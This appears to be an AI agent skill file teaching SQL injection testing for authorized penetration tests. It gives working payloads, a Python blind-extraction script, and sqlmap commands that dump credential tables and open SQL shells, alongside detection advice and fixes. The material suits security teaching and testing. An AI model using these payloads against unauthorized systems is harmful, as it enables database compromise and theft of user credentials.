---
name: web-sqli
description: Use when testing a web application for SQL injection on an
  authorized engagement. Covers detection and confirmation probes, UNION-based
  extraction, boolean and time-based blind techniques, error-based extraction,
  second-order injection, and sqlmap 1.9.2 automation plus full manual fallback
  when automation is blocked. Use when login forms, search boxes, URL
  parameters, cookies, or API inputs look injectable, or when a scan flags a
  possible database error.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [web-xss, api-security-testing]
tools:
  - name: sqlmap
    version: 1.9.2
  - name: Burp Suite
    version: "2026.2"
  - name: Python
    version: "3.12"
---

SQL injection is a flaw where user input is concatenated into a database query
without safe handling, letting an attacker read, change, or delete data they
should not touch. This skill covers the full authorized methodology: finding
injectable parameters, confirming the injection class, choosing the right
extraction technique, automating with sqlmap 1.9.2, and working manually when
automation fails. All testing targets systems you have written permission to
test.

## Quick Workflow

1. Map every input that reaches the application: URL parameters, form fields,
   headers, and cookies.
2. Probe each input with a single quote, a double quote, and boolean
   expressions to spot injectable points and error messages.
3. Confirm the injection class (in-band UNION, boolean blind, time blind,
   error-based, or stacked queries) with minimal requests.
4. Enumerate with UNION when output is visible, otherwise switch to boolean
   or time-based blind extraction.
5. List databases, tables, columns, then dump only the data needed to prove
   impact.
6. Check for second-order injection in stored data that is rendered later.
7. Automate confirmed points with sqlmap, using tampers and delays that
   respect the agreed test window.
8. Record every query, response difference, and extracted value for the
   report.

## 1. Detection and confirmation

Start with cheap probes. Send one request at a time and watch for database
errors, timing changes, or logic changes.

```bash
# Baseline request (GET parameter)
curl -s 'https://target.example/item?id=5' | head -c 300

# Single quote probe: look for SQL error text or a changed page
curl -s "https://target.example/item?id=5'" -o /tmp/probe1.html
diff <(curl -s 'https://target.example/item?id=5') /tmp/probe1.html | head -20

# Boolean probe: true condition should return the normal page
curl -s "https://target.example/item?id=5%20AND%201%3D1"
# False condition should return an empty or different page
curl -s "https://target.example/item?id=5%20AND%201%3D2"

# Time probe for blind cases (MySQL)
time curl -s "https://target.example/item?id=5%20AND%20SLEEP(4)--%20-"
```

Post parameters, cookies, and headers are injectable too. Repeat the same
probes there:

```bash
curl -s -X POST 'https://target.example/login' \
  -d "user=admin'&pass=x" | grep -i -E 'sql|syntax|error' | head -5
```

If the application hides errors, use the boolean and time probes only. A
consistent true/false page difference is enough to confirm injection before
you extract anything.

## 2. UNION-based exploitation

Use UNION when query output is reflected on the page. First find the column
count with ORDER BY, then find which columns print to the page.

```bash
# Find column count: increase n until the page breaks, then use n-1
for n in 1 2 3 4 5 6 7 8; do
  code=$(curl -s -o /dev/null -w '%{http_code}' \
    "https://target.example/item?id=5%20ORDER%20BY%20$n--%20-")
  echo "ORDER BY $n -> HTTP $code"
done
```

```bash
# Example with 3 columns: find visible columns (numbers appear on the page)
curl -s "https://target.example/item?id=-5%20UNION%20SELECT%201,2,3--%20-"

# Replace a visible column with data of interest
curl -s "https://target.example/item?id=-5%20UNION%20SELECT%201,user(),3--%20-"

# MySQL: list databases, then tables, then columns
curl -s "https://target.example/item?id=-5%20UNION%20SELECT%201,schema_name,3%20FROM%20information_schema.schemata--%20-"
curl -s "https://target.example/item?id=-5%20UNION%20SELECT%201,table_name,3%20FROM%20information_schema.tables%20WHERE%20table_schema%3D'targetdb'--%20-"
curl -s "https://target.example/item?id=-5%20UNION%20SELECT%201,column_name,3%20FROM%20information_schema.columns%20WHERE%20table_name%3D'users'--%20-"

# Dump credentials in one request, concatenated for a single visible column
curl -s "https://target.example/item?id=-5%20UNION%20SELECT%201,group_concat(username,0x3a,password),3%20FROM%20targetdb.users--%20-"
```

PostgreSQL and MSSQL variants: replace `information_schema.schemata` with
`pg_database` or `sys.databases`, and `group_concat` with `string_agg`
(Postgres) or `STRING_AGG` (MSSQL).

## 3. Boolean-based blind extraction

When nothing is printed, extract data one bit at a time by asking true/false
questions and reading the page difference.

```bash
# Is the first character of the database name 't'?
curl -s "https://target.example/item?id=5%20AND%20SUBSTRING(database(),1,1)%3D't'--%20-" \
  | grep -c 'Welcome'
```

Automate the loop with Python (stdlib only) instead of doing this by hand:

```python
#!/usr/bin/env python3
"""Boolean-blind extractor: recovers the current database name."""
import urllib.request, urllib.parse

BASE = "https://target.example/item?id=5"
TRUE_MARKER = b"Welcome"  # string present only on the true page

def ask(payload):
    url = BASE + urllib.parse.quote(payload, safe="()='")
    with urllib.request.urlopen(url, timeout=15) as r:
        return TRUE_MARKER in r.read()

result = ""
for pos in range(1, 33):
    found = False
    for c in "abcdefghijklmnopqrstuvwxyz0123456789_":
        if ask(f" AND SUBSTRING(database(),{pos},1)='{c}'-- -"):
            result += c
            found = True
            break
    if not found:
        break
    print(f"[*] so far: {result}")
```

Binary search on character codes halves the request count. Add request
delays so the loop does not hammer the target.

## 4. Time-based blind extraction

Use time delays when the page never changes between true and false.

```bash
# MySQL: 4 second delay confirms time-based injection
time curl -s "https://target.example/item?id=5%20AND%20IF(1%3D1,SLEEP(4),0)--%20-"

# PostgreSQL
time curl -s "https://target.example/item?id=5%3BSELECT%20pg_sleep(4)--%20-"

# Microsoft SQL Server
time curl -s "https://target.example/item?id=5%3BWAITFOR%20DELAY%20'0:0:4'--%20-"

# Oracle
time curl -s "https://target.example/item?id=5%20AND%201%3DDBMS_PIPE.RECEIVE_MESSAGE('x',4)--%20-"
```

Extract with conditional delays, same loop idea as the boolean script but
measuring response time instead of page content. Keep delays small (2 to 4
seconds) so a full extraction does not take all night, and never run these
during business hours unless the scope allows it.

## 5. Error-based extraction

Force the database to print data inside its own error messages.

```bash
# MySQL extractvalue (error shows the injected value)
curl -s "https://target.example/item?id=5'%20AND%20extractvalue(1,concat(0x3a,(SELECT%20user())))--%20-"

# MySQL updatexml variant
curl -s "https://target.example/item?id=5'%20AND%20updatexml(1,concat(0x3a,(SELECT%20version())),1)--%20-"

# PostgreSQL: cast error leaks data
curl -s "https://target.example/item?id=5%20AND%201%3DCAST((SELECT%20current_user)%20AS%20int)--%20-"

# MSSQL: convert error leaks data
curl -s "https://target.example/item?id=5%20AND%201%3DCONVERT(int,(SELECT%20@@version))--%20-"
```

Read the error output, decode the hex or delimited value, and continue
enumerating tables and columns through the same channel.

## 6. Second-order SQL injection

Second-order injection stores the payload on one request and executes it on
a later request (for example a username that is saved at registration and
later used in an admin query). Test by registering values with quotes and
boolean logic, then visiting every page that displays them.

```bash
# Register a user whose name contains a probe
curl -s -X POST 'https://target.example/register' \
  -d "user=test'AND'1'='1&pass=Password1!"

# Then load pages that display the username (profile, admin panel)
curl -s 'https://target.example/profile' | grep -i -E 'sql|syntax'
```

```bash
# sqlmap second-order support: inject at the registration form,
# let sqlmap check the profile page for the effect
sqlmap -u "https://target.example/register" --data="user=test*&pass=x" \
  --second-url="https://target.example/profile" --batch
```

## 7. sqlmap 1.9.2 automation

Once a point is confirmed, let sqlmap do the heavy lifting. Start narrow,
then widen only if needed.

```bash
# Quick detection with a request file captured from Burp
sqlmap -r /tmp/login.req --batch

# Enumerate current user, database, and databases
sqlmap -u "https://target.example/item?id=1" --batch \
  --current-user --current-db --dbs

# Full enumeration of one database
sqlmap -u "https://target.example/item?id=1" --batch \
  -D targetdb --tables
sqlmap -u "https://target.example/item?id=1" --batch \
  -D targetdb -T users --columns
sqlmap -u "https://target.example/item?id=1" --batch \
  -D targetdb -T users -C username,password --dump

# POST form with cookies and a tamper script for basic filters
sqlmap -u "https://target.example/search" --data="q=test*" \
  --cookie="session=abc123" --batch \
  --tamper=space2comment --random-agent

# Limit technique and raise level/risk only on permission
sqlmap -u "https://target.example/item?id=1" --batch \
  --technique=U --level=5 --risk=3 --threads=2

# Interactive SQL shell on a confirmed injection
sqlmap -u "https://target.example/item?id=1" --batch --sql-shell

# Route through Burp to inspect every request sqlmap sends
sqlmap -u "https://target.example/item?id=1" --batch \
  --proxy=http://127.0.0.1:8080
```

Keep `--threads` low (1 or 2) on fragile targets. Use `--delay=1` and
`--timeout=30` when the application is slow. Always set `--batch` so sqlmap
never asks interactive questions during an unattended run, and review
`--flush-session` between distinct targets so cached results do not leak
across tests.

## 8. Proving impact without damage

Read-only proof is enough for most reports: current user, database name,
one row of non-sensitive data, and a screenshot of the dumped table list.
Only use `--os-shell` or file read/write when the rules of engagement allow
operating system command execution, and stop at a harmless `whoami` style
proof rather than planting persistence.

## Edge cases

- WAF or filter blocks quotes and keywords. Try tamper scripts
  (`space2comment`, `between`, `randomcase`), or switch to boolean blind
  which needs fewer suspicious keywords.
- Parameter is numeric but quoted in the query. Test both `5'` and
  `5 AND 1=1` styles; a broken page on `'` alone is not proof of
  injectability if the app just validates integers.
- Multiple stacked parameters: only one may be injectable. Test each
  parameter in isolation with `*` marking in sqlmap.
- JSON or XML request bodies. sqlmap handles JSON with `-u` plus
  `--data='{"id":1*}'`; mark the injectable field with `*`.
- Cookies and custom headers (User-Agent, X-Forwarded-For) are injected
  into queries by logging code. Test them with `--level=5` or manual
  probes.
- The application returns HTTP 500 on every probe. The injection may still
  be blind; switch to time-based and compare delays instead of content.

## Escalation

- UNION fails because of type mismatch: match column types with
  `CAST(... AS CHAR)` or use NULL for non-visible columns, and confirm the
  count with `ORDER BY` again after each change.
- Boolean blind is too slow: extract with `SUBSTRING` on hex-encoded data
  to use a smaller alphabet, or move to time-based with binary search.
- Time-based is blocked by `SLEEP` filters: try `BENCHMARK(10000000,MD5(1))`
  on MySQL, or heavy queries like `SELECT COUNT(*) FROM
  information_schema.columns` repeated in a subquery.
- sqlmap reports "not injectable" but manual probes differ: replay the
  exact manual request through `--proxy` to Burp, save it as a request
  file, and rerun with `-r`.
- Second-order shows nothing: widen the crawl to admin and reporting
  pages, because the payload may execute far from where it was stored.
- Database is not MySQL: fingerprint with `--banner` or
  `SELECT @@version`, then switch the information_schema queries to the
  matching dialect.

## Detection and defender view

Defenders see SQL injection as repeated requests with quote characters,
SQL keywords (`UNION`, `SELECT`, `SLEEP`, `information_schema`) in
parameters, bursts of similar requests from one IP (blind extraction
loops), and database error messages in application logs. A WAF logs blocked
patterns but attackers pivot to blind techniques that leave almost no
keyword trail. The durable fixes are parameterized queries or prepared
statements, least-privilege database accounts (no DBA rights for the web
app user), and removing verbose database errors from production responses.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application): the injection
  itself.
- CWE-89 (Improper Neutralization of Special Elements used in an SQL
  Command, SQL Injection).
- CWE-20 (Improper Input Validation): the root cause class.
- CWE-209 (Generation of Error Message Containing Sensitive Information):
  verbose SQL errors.
- OWASP Testing Guide: Testing for SQL Injection (OTG-INPVAL-005).
- sqlmap 1.9.2 usage guide: https://sqlmap.org/usage/
- PortSwigger Web Security Academy: SQL injection labs and cheat sheet.

## See also

- `ctf-web-challenges-sqli-challenges`: Use it instead for the competition version, framed around extracting a flag through SQL injection.
